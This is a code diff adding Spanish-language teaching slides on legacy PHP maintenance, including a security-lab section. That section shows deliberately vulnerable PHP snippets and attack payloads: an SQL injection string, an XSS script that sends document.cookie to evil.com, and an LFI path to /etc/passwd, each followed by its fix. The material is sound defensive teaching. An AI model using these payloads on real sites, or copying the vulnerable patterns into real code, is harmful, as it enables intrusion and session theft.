@@ -19,6 +19,7 @@ const {
   addAgentOrchestrationDiagram,
   addPromptQualityCompare,
   addTableSchema,
+  addAgenticFlow,
 } = components;
 const { validateSlide } = utils;
 
@@ -226,7 +227,7 @@ function createSpaghettiPatternSlide() {
 <?php if ($res) { ?> <!-- Capa de Lógica -->
     <h1><?php echo $res['name']; ?></h1> <!-- Capa de Vista -->
 <?php } ?>`,
-    lang: "php", fontSize: 16
+    lang: "html", fontSize: 16
   });
   validateSlide(slide, pptx);
 }
@@ -429,7 +430,7 @@ function createOutputTagsSlide() {
 
 <!-- Depuración (Solo para programadores) -->
 <pre><?php print_r($mi_arreglo); ?></pre>`,
-    lang: "php", fontSize: 16
+    lang: "html", fontSize: 16
   });
   validateSlide(slide, pptx);
 }
@@ -789,11 +790,15 @@ if (!isset($_SESSION['user_id'])) {
 function createSessionIdActionSlide() {
   const slide = pptx.addSlide();
   addHeader(slide, "El ID de Sesión en Acción", "Bloque 3 · 3.2 Viaje en los Headers", "Protocolo");
-  addDelegationSplit(slide, SH, {
-    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Headers HTTP Reales",
-    left: { title: "Respuesta (Login)", subtitle: "Set-Cookie", items: ["Server -> Browser", "Set-Cookie: PHPSESSID=abc123...", "Crea el vínculo físico."], accent: C.red, fill: C.paleRed },
-    right: { title: "Petición (Perfil)", subtitle: "Cookie", items: ["Browser -> Server", "Cookie: PHPSESSID=abc123...", "Recupera el casillero."], accent: C.navy, fill: C.softBlue },
-    bridgeLabel: "↔", bridgeBody: "PHPSESSID",
+  
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Persistencia vía Headers HTTP", columns: 2,
+    entries: [
+      { badge: "STEP 1", title: "Respuesta (Login)", body: "El servidor envía el Header 'Set-Cookie: PHPSESSID=abc123...'.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "STEP 2", title: "Almacenamiento", body: "El navegador guarda el ID en su jarra de cookies local asociada al dominio.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "STEP 3", title: "Petición (Perfil)", body: "En cada nuevo clic, el navegador incluye el Header 'Cookie: PHPSESSID=abc123...'.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+      { badge: "STEP 4", title: "Reconocimiento", body: "PHP lee el ID, busca el archivo en /tmp y rellena el arreglo $_SESSION.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+    ]
   });
   validateSlide(slide, pptx);
 }
@@ -932,14 +937,13 @@ function createBlock4IntroSlide() {
 function createAllInOneAnatomySlide() {
   const slide = pptx.addSlide();
   addHeader(slide, "Anatomía del 'Todo-en-Uno'", "Bloque 4 · 4.1 Descomposición del archivo", "Anatomía");
-  addTableSchema(slide, SH, {
-    x: 0.88, y: 2.22, w: 10.26, title: "Estructura típica de un archivo legacy (editar_user.php)",
-    columns: [
-      { name: "Zona", type: "Responsabilidad Técnica" },
-      { name: "Cabecera (L1-15)", type: "session_start() y Conexión a Base de Datos (mysqli)." },
-      { name: "Lógica POST (L16-45)", type: "if($_POST) -> Captura datos y ejecuta el UPDATE SQL." },
-      { name: "Consulta (L46-55)", type: "SELECT inicial para cargar los datos actuales en el form." },
-      { name: "Vista (L56+)", type: "Mezcla de HTML con PHP para mostrar los valores (echo)." }
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Estructura típica de un archivo legacy (editar_user.php)", columns: 2,
+    entries: [
+      { badge: "L1-15", title: "Cabecera", body: "session_start() y Conexión a Base de Datos (mysqli).", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "L16-45", title: "Lógica POST", body: "if($_POST) -> Captura datos y ejecuta el UPDATE SQL.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+      { badge: "L46-55", title: "Consulta", body: "SELECT inicial para cargar los datos actuales en el form.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "L56+", title: "Vista", body: "Mezcla de HTML con PHP para mostrar los valores (echo).", accent: C.gold, fill: C.white, badgeFill: C.gold }
     ]
   });
   validateSlide(slide, pptx);
@@ -1028,7 +1032,359 @@ function createPhase3ViewSlide() {
        value="<?php echo $user_data['emergency_phone']; ?>">
 
 <!-- El atributo 'name' debe coincidir con nuestra Fase 1 -->`,
+    lang: "html", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createMonsterFileMappingSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Arqueología: El Archivo Monstruo", "Bloque 4 · 4.4 Mapeo de Grandes Volúmenes", "Arqueología");
+  addCard(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "El desafío de las 1000+ líneas",
+    body: "En producción, no operamos archivos de 20 líneas. Encontraremos scripts gigantes con lógica de hace 10 años. No podemos leerlo todo; debemos mapear.",
+    accent: C.navy, fill: C.white, line: C.border
+  });
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Táctica de Mapeo con IA", columns: 2,
+    entries: [
+      { badge: "STEP 1", title: "Carga de Contexto", body: "Entregar el archivo completo al agente para análisis de flujo.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "STEP 2", title: "Extracción de Nombres", body: "Listar variables de sesión y POST que el archivo utiliza.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "STEP 3", title: "Grafo de Dependencias", body: "Identificar qué otros archivos incluye (include/require).", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+      { badge: "STEP 4", title: "Puntos de Retorno", body: "Localizar todos los 'header(Location...)' y 'exit;'.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+    ]
+  });
+  validateSlide(slide, pptx);
+}
+
+function createProfessionalLogsSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Diagnóstico: El Arte de Leer Logs", "Bloque 4 · 4.4 Visibilidad en el Caos", "Diagnóstico");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.22, w: 6.8, h: 4.54, title: "Habilitando el Microscopio",
+    code: `<?php
+// En desarrollo, queremos ver el error de inmediato
+ini_set('display_errors', 1);
+error_reporting(E_ALL);
+
+// En producción, NUNCA mostramos errores al usuario. 
+// Los mandamos a un archivo secreto:
+error_log("Falla al actualizar user ID: $id", 3, "/var/log/app_errors.log");
+?>`,
     lang: "php", fontSize: 16
+  });
+  addMiniCard(slide, SH, {
+    x: 7.94, y: 2.22, w: 3.2, h: 4.54, title: "Mentalidad Senior",
+    body: "Un amateur intenta corregir probando a ciegas en el navegador. Un profesional abre la terminal y revisa el log de errores para ver el mensaje exacto del servidor.",
+    accent: C.red, fill: C.paleRed, titleFontSize: 14, bodyFontSize: 11
+  });
+  validateSlide(slide, pptx);
+}
+
+function createLegacySanitizationSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Sanitización Dual: El Escudo", "Bloque 4 · 4.5 Seguridad en la Jungla", "Seguridad");
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Dos tipos de ataques, dos soluciones", columns: 2,
+    entries: [
+      { badge: "SQLi", title: "mysqli_real_escape_string()", body: "Limpia comillas y caracteres raros antes de que lleguen a la Base de Datos.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "XSS", title: "htmlspecialchars()", body: "Convierte etiquetas <script> en texto inofensivo para que no se ejecuten al mostrar.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "RULE", title: "Filtro de Entrada", body: "Todo lo que viene de $_POST es radiactivo hasta que lo limpies.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "RULE", title: "Filtro de Salida", body: "Todo lo que imprimes con 'echo' debe ser sanitizado para la vista.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+    ]
+  });
+  validateSlide(slide, pptx);
+}
+
+function createSeamPatternSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "El Patrón 'Costura' (Seam)", "Bloque 4 · 4.5 Intervención de Mínimo Impacto", "Patrones");
+  addCenterStatement(slide, SH, "Una 'Costura' es un lugar donde puedes alterar el comportamiento sin editar el código fuente original (o editándolo mínimamente).", {
+    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
+  });
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 3.6, w: 10.26, h: 3.16, title: "Identificando la costura en editar_user.php",
+    code: `// COSTURA: El punto exacto antes del mysqli_query
+$telefono = clean($_POST['tel']); 
+
+/* --- Nuestra Intervención Quirúrgica --- */
+log_change($id, 'edit_phone'); // Nuevo sistema
+/* --------------------------------------- */
+
+mysqli_query($conn, "UPDATE users SET phone='$telefono' WHERE id=$id");`,
+    lang: "php", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createCharacterizationTestSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Test de Caracterización con IA", "Bloque 4 · 4.6 IA como Red de Seguridad", "Metodología");
+  addPromptQualityCompare(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
+    title: "IA como Test Unitario Humano",
+    badTitle: "Pregunta Genérica",
+    badSubtitle: "Poco útil",
+    badPrompt: "'¿Este código PHP funciona bien?'.",
+    badNotes: ["IA dirá que sí o dará consejos genéricos.", "No ayuda a prevenir regresiones.", "No entiende el flujo."],
+    goodTitle: "Pregunta de Caracterización",
+    goodSubtitle: "Analizando Casos de Borde",
+    goodPrompt: "'Analiza este PHP: ¿Qué pasa exactamente si $_SESSION['user_id'] está vacío y el usuario envía el POST? Describe el flujo paso a paso'.",
+    goodNotes: ["Revela huecos de seguridad.", "Documenta el comportamiento real.", "Actúa como un test antes de cambiar."],
+    footer: "Caracterizar es entender cómo se comporta el sistema HOY, antes de intentar mejorarlo."
+  });
+  validateSlide(slide, pptx);
+}
+
+function createLegacyDatesSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Fechas y Tiempos en el Barro", "Bloque 4 · 4.6 El dolor de cabeza clásico", "Datos");
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Manejo de Tiempos Legacy", columns: 2,
+    entries: [
+      { badge: "DATE", title: "date('Y-m-d')", body: "La forma clásica de formatear. Cuidado con el timezone del servidor.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+      { badge: "STR", title: "strtotime()", body: "Convierte casi cualquier texto en un timestamp. Es poderosa pero impredecible.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+      { badge: "DB", title: "Formatos Inconsistentes", body: "En el legado verás fechas como strings, como enteros o como datetime.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+      { badge: "IA", title: "IA al rescate", body: "Usa agentes para convertir formatos complejos entre el front y la DB legacy.", accent: C.gold, fill: C.white, badgeFill: C.gold },
+    ]
+  });
+  validateSlide(slide, pptx);
+}
+
+function createLegacyEncodingSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "El Error de la 'Ñ': Encodings", "Bloque 4 · 4.6 UTF-8 vs. Latin1", "Datos");
+  addDelegationSplit(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Guerra de Caracteres",
+    left: { title: "App Moderna", subtitle: "UTF-8", items: ["Soporta emojis.", "Soporta todos los idiomas.", "Estándar global."], accent: C.navy, fill: C.softBlue },
+    right: { title: "Sistemas Legacy", subtitle: "ISO-8859-1", items: ["Solo soporta latinos básicos.", "Rompe las tildes y las 'ñ'.", "Causa el 'mojibake' (Ã±)."], accent: C.red, fill: C.paleRed },
+    bridgeLabel: "vs", bridgeBody: "codificación",
+  });
+  validateSlide(slide, pptx);
+}
+
+function createDocumentationArcheologySlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Documentación Arqueológica", "Bloque 4 · 4.7 Sembrando para el Futuro", "Documentación");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Comentando lo indescifrable con IA",
+    code: `/* 
+  ARQUEOLOGÍA TÉCNICA - 20/04/2026
+  Este bloque maneja el cálculo de impuestos legacy.
+  NO TOCAR: El redondeo afecta la integración con el banco.
+  Regla original: si el monto < 1000, no aplica tasa.
+*/
+if ($monto < 1000) { ... }`,
+    lang: "php", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+// ─── SEGURIDAD Y AUDITORÍA ───────────────────────────────────────────────────
+
+function createSecurityHazardsChecklistSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Checklist de Peligros Legacy", "Bloque 4 · 4.8 Auditoría de Seguridad", "Seguridad");
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "¿Qué buscar apenas abres un .php antiguo?", columns: 2,
+    entries: [
+      { badge: "SQL", title: "Concatenación SQL", body: "Busca variables PHP pegadas directamente en strings de SELECT/UPDATE.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "EVAL", title: "Uso de eval()", body: "Cualquier ejecución de strings como código es una puerta abierta total.", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "FILE", title: "include/require dinámicos", body: "Carga de archivos basada en variables de URL ($_GET['page']).", accent: C.red, fill: C.white, badgeFill: C.red },
+      { badge: "TYPE", title: "Falta de Casting", body: "Usar IDs de URL sin asegurar que sean enteros: (int)$_GET['id'].", accent: C.gold, fill: C.white, badgeFill: C.gold },
+    ]
+  });
+  validateSlide(slide, pptx);
+}
+
+function createSqlInjectionLabInsecureSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab SQLi: El Código Inseguro", "Bloque 4 · 4.8 Caso de Estudio SQLi", "Inseguro");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "buscar_usuario.php (Vulnerable)",
+    code: `<?php
+include('db.php');
+$id = $_GET['id']; // Captura directa sin filtro
+
+// VULNERABILIDAD: El dato entra directo a la query
+$sql = "SELECT * FROM users WHERE id = " . $id;
+
+$res = mysqli_query($conn, $sql);
+$user = mysqli_fetch_assoc($res);
+echo "Hola: " . $user['username'];
+?>`,
+    lang: "php", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createSqlInjectionLabExploitSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab SQLi: El Exploit", "Bloque 4 · 4.8 Rompiendo la lógica", "Exploit");
+  addCard(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Ataque por bypass de ID",
+    body: "Si el atacante cambia la URL por: buscar.php?id=-1 OR 1=1 --",
+    accent: C.red, fill: C.paleRed, line: C.red
+  });
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 3.82, w: 10.26, h: 2.94, title: "Resultado en el Servidor (SQL resultante)",
+    code: `SELECT * FROM users WHERE id = -1 OR 1=1 --
+
+/* 
+  Explicación:
+  - id = -1 (No devuelve nada)
+  - OR 1=1 (Siempre es verdadero, devuelve TODA la tabla)
+  - -- (Comenta el resto de la query original)
+*/`,
+    lang: "sql", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createSqlInjectionLabFixSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab SQLi: Parche Quirúrgico", "Bloque 4 · 4.8 Solución de Mínimo Impacto", "Corregido");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Parcheando sin romper el estilo del autor",
+    code: `<?php
+include('db.php');
+
+// SOLUCIÓN 1: Forzar tipo entero (Casting)
+$id = (int)$_GET['id']; 
+
+// SOLUCIÓN 2: Sanitización de escape
+// $id = mysqli_real_escape_string($conn, $_GET['id']);
+
+$sql = "SELECT * FROM users WHERE id = " . $id;
+// Ahora la query es segura porque $id es garantizadamente un número.
+?>`,
+    lang: "php", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createXssLabInsecureSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab XSS: El Código Inseguro", "Bloque 4 · 4.9 Inyección en la Vista", "Inseguro");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "saludo.php (Vulnerable)",
+    code: `<?php
+$nombre = $_GET['nombre']; // "Diego"
+?>
+<div class="welcome">
+    <!-- VULNERABILIDAD: Impresión cruda en el HTML -->
+    <h1>Bienvenido, <?php echo $nombre; ?></h1>
+</div>`,
+    lang: "html", fontSize: 16
+  });
+  validateSlide(slide, pptx);
+}
+
+function createXssLabExploitSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab XSS: El Exploit", "Bloque 4 · 4.9 Robo de sesión", "Exploit");
+  addCard(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 1.4, title: "Inyección de Script Malicioso",
+    body: "Atacante envía URL: saludo.php?nombre=<script>fetch('https://evil.com?c='+document.cookie)</script>",
+    accent: C.red, fill: C.paleRed, line: C.red
+  });
+  addCenterStatement(slide, SH, "El navegador del usuario ejecutará el script, enviando sus cookies al servidor del atacante sin que se de cuenta.", {
+    x: 0.88, y: 3.82, w: 10.26, h: 2.94, fill: C.white, color: C.red, fontSize: 20, bold: true
+  });
+  validateSlide(slide, pptx);
+}
+
+function createXssLabFixSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab XSS: El Estándar de Oro", "Bloque 4 · 4.9 htmlspecialchars()", "Corregido");
+  addCodePanel(slide, SH, {
+    x: 0.5, y: 2.22, w: 12.33, h: 4.54, title: "Escape de caracteres especiales",
+    code: `<?php
+$nombre = $_GET['nombre'];
+?>
+<div class="welcome">
+    <!-- SEGURO: Convierte < en &lt; y > en &gt; -->
+    <h1>Bienvenido, <?php echo htmlspecialchars($nombre, ENT_QUOTES, 'UTF-8'); ?></h1>
+</div>
+
+<!-- El navegador mostrará el código del script como texto, no lo ejecutará. -->`,
+    lang: "html", fontSize: 15
+  });
+  validateSlide(slide, pptx);
+}
+
+function createLfiLabSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Lab LFI: Inyección de Archivos", "Bloque 4 · 4.10 Local File Inclusion", "Peligro");
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 2.0, w: 10.26, h: 1.6, title: "Vulnerable (Insecure)",
+    code: `// index.php?page=contacto
+include($_GET['page'] . ".php"); // ¡Atacante puede poner ../../../etc/passwd!`,
+    lang: "php", fontSize: 14
+  });
+  addCodePanel(slide, SH, {
+    x: 0.88, y: 3.8, w: 10.26, h: 3.2, title: "Seguro (Whitelisting)",
+    code: `$allowed = ['home', 'contacto', 'perfil'];
+$page = $_GET['page'] ?? 'home';
+
+if (in_array($page, $allowed)) {
+    include($page . ".php");
+} else {
+    die("Página no permitida");
+}`,
+    lang: "php", fontSize: 14
+  });
+  validateSlide(slide, pptx);
+}
+
+function createAiSecurityAuditorSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "IA como Auditora de Código Inseguro", "Bloque 4 · Huella Metodológica", "Auditoría");
+  addPromptQualityCompare(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.46,
+    title: "Encontrando Agujeros en el Pasado",
+    badTitle: "Prompt Débil",
+    badSubtitle: "Superficial",
+    badPrompt: "'¿Este código PHP es seguro?'.",
+    badNotes: ["Falla en ver la conexión con la DB.", "Ignora el contexto de las sesiones.", "Da una respuesta genérica."],
+    goodTitle: "Prompt de Auditoría",
+    goodSubtitle: "Simulación de Ataque",
+    goodPrompt: "'Actúa como un analista de seguridad. Examina este script legacy: lista puntos de SQL Injection, XSS y LFI. Sugiere correcciones quirúrgicas que mantengan la compatibilidad'.",
+    goodNotes: ["Mapea ataques reales.", "Prioriza el parcheo.", "Explica el porqué del riesgo."],
+    footer: "La IA lee el código 'con malicia' para que tú lo repares con maestría."
+  });
+  validateSlide(slide, pptx);
+}
+
+function createDefenseInDepthLegacySlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Defensa en Profundidad en el Barro", "Bloque 4 · 4.11 Capas de Protección", "Estrategia");
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 2.22, w: 10.26, h: 4.54, title: "Protegiendo cuando no puedes refactorizar todo", columns: 2,
+    entries: [
+      { badge: "WAF", title: "Firewall de Aplicación", body: "Usar ModSecurity o Cloudflare para bloquear ataques conocidos antes de que lleguen al PHP.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "PHP", title: "Endurecimiento de php.ini", body: "Deshabilitar allow_url_fopen y funciones peligrosas como system/exec.", accent: C.navy, fill: C.softBlue, badgeFill: C.navy },
+      { badge: "DB", title: "Permisos Mínimos", body: "Que el usuario de la DB solo tenga permisos de SELECT/UPDATE, no de DROP o CREATE.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+      { badge: "LOG", title: "Monitoreo de Anomalías", body: "Alertar si una IP genera demasiados errores de sintaxis SQL en poco tiempo.", accent: C.red, fill: C.paleRed, badgeFill: C.red },
+    ]
+  });
+  validateSlide(slide, pptx);
+}
+
+function createTechnicalDebtEthicsSlide() {
+  const slide = pptx.addSlide();
+  addHeader(slide, "Ética y Profesionalismo ante el Legado", "Bloque 4 · 4.7 La mentalidad del Ingeniero Senior", "Ética");
+  addCenterStatement(slide, SH, "No te quejes del código que hoy sostiene tu sueldo. Tu trabajo es ser la solución, no el crítico.", {
+    x: 0.88, y: 2.22, w: 10.26, h: 1.14, fill: C.navy, color: C.white, fontSize: 18, rectRadius: 0.07
+  });
+  addChecklistGrid(slide, SH, {
+    x: 0.88, y: 3.6, w: 10.26, h: 3.16, title: "El Decálogo del Profesional", columns: 2,
+    entries: [
+      { badge: "RESP", title: "Respeto al Autor", body: "No insultes el código viejo; no sabes bajo qué presión se escribió.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+      { badge: "VAL", title: "Valor del Negocio", body: "Si el código feo genera dinero, es código exitoso.", accent: C.navy, fill: C.white, badgeFill: C.navy },
+      { badge: "HUM", title: "Humildad Técnica", body: "Saber FastAPI es fácil; saber arreglar PHP sin romperlo es difícil.", accent: C.gold, fill: C.white, badgeFill: C.gold },
+      { badge: "IA", title: "IA como Aliada", body: "Usa herramientas modernas para domar tecnologías antiguas.", accent: C.gold, fill: C.white, badgeFill: C.gold },
+    ]
   });
   validateSlide(slide, pptx);
 }
@@ -1141,13 +1497,13 @@ function createFinalClosingSlide() {
   slide.background = { color: C.navy };
   addMarkBox(slide, SH, logoMarkPath, { x: 9.62, y: 0.28, w: 0.68, h: 0.68 });
   addBarsMotif(slide, 0.88, 1.22, 1.1, C.gold);
-  slide.addText("Próxima Clase:\nArquitectura MVC", {
+  slide.addText("Próxima Clase:\nPatrones y MVC", {
     x: 0.88, y: 2.14, w: 9.2, h: 1.26, fontFace: TYPOGRAPHY.display, fontSize: 36, bold: true, color: C.white, valign: "mid",
   });
-  slide.addText("Aprenderemos a poner orden al caos legacy separando definitivamente la lógica de la vista.", {
+  slide.addText("Descubriremos cómo aplicar patrones de diseño para rescatar el código legacy, separando la lógica de negocio de la visualización para lograr sistemas escalables.", {
     x: 0.88, y: 3.62, w: 8.2, h: 0.8, fontFace: TYPOGRAPHY.body, fontSize: 15.2, color: "DCE6F2",
   });
-  addCenterStatement(slide, SH, "Nos vemos el miércoles 22 de abril", {
+  addCenterStatement(slide, SH, "Nos vemos el martes 21 de abril", {
     x: 0.88, y: 5.82, w: 10.26, h: 0.82, fill: C.gold, fontSize: 24, color: C.navy, bold: true
   });
   validateSlide(slide, pptx);
@@ -1162,7 +1518,7 @@ function main() {
   createObjectivesSlide();
   createLearningPathSlide();
   createIntegrityPrincipleSlide();
-  
+
   createBlock1IntroSlide();
   createLegacyDefinitionSlide();
   createArchFilesVsResourcesSlide();
@@ -1214,6 +1570,31 @@ function main() {
   createPhase1InputSlide();
   createPhase2PersistenceSlide();
   createPhase3ViewSlide();
+
+  // Expansión Bloque 4
+  createMonsterFileMappingSlide();
+  createProfessionalLogsSlide();
+  createLegacySanitizationSlide();
+  createSeamPatternSlide();
+  createCharacterizationTestSlide();
+  createLegacyDatesSlide();
+  createLegacyEncodingSlide();
+  createDocumentationArcheologySlide();
+  
+  // Auditoría de Seguridad
+  createSecurityHazardsChecklistSlide();
+  createSqlInjectionLabInsecureSlide();
+  createSqlInjectionLabExploitSlide();
+  createSqlInjectionLabFixSlide();
+  createXssLabInsecureSlide();
+  createXssLabExploitSlide();
+  createXssLabFixSlide();
+  createLfiLabSlide();
+  createAiSecurityAuditorSlide();
+  createDefenseInDepthLegacySlide();
+
+  createTechnicalDebtEthicsSlide();
+
   createQuotesDangerSlide();
   createIaSurgicalConsultantSlide();
   createSmokeTestSlide();
